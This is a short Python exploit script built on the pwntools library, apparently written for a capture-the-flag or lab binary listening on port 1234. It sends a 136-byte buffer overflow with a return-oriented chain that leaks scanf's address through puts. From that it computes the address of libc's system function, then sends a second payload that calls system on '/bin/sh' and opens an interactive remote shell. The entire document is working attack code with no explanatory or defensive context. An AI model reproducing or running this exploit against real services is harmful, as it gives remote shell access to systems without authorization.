from pwn import *

# Addresses
pr1 = 0x004006b3 # pop rdi; ret
mainaddr = 0x00400633
putsPLT = 0x004004e0
scanfGOT = 0x600ff8
binsh = 0x004006e3

scanfOffset = 0x00064e80 
systemOffset = 0x0003f450

context.log_level = 'debug'

# Exploit
def main():

# open process
    r = remote('localhost', 1234)
    #r = remote('192.168.122.76', 1234)

    # PLT info leak
    payload = "A" * 136
    payload += p64(pr1)
    payload += p64(scanfGOT)
    payload += p64(putsPLT)
    payload += p64(mainaddr)
    r.sendline(payload)
    
    # get scanf address
    leak = r.recvn(0x1b)
    scanfLeak = unpack(leak[20:26], 48)
    log.info("libcLeak = " + hex(scanfLeak))
    libcBase = scanfLeak - scanfOffset
    log.info("libcBase = " + hex(libcBase))
    libcSystem = libcBase + systemOffset
    log.info("libcSystem = " + hex(libcSystem))  

    # get shell
    payload = "A" * 136
    payload += p64(pr1)
    payload += p64(binsh)
    payload += p64(libcSystem)
    r.sendline(payload)

    r.interactive()
    
# Main
if __name__ == "__main__":
    main()
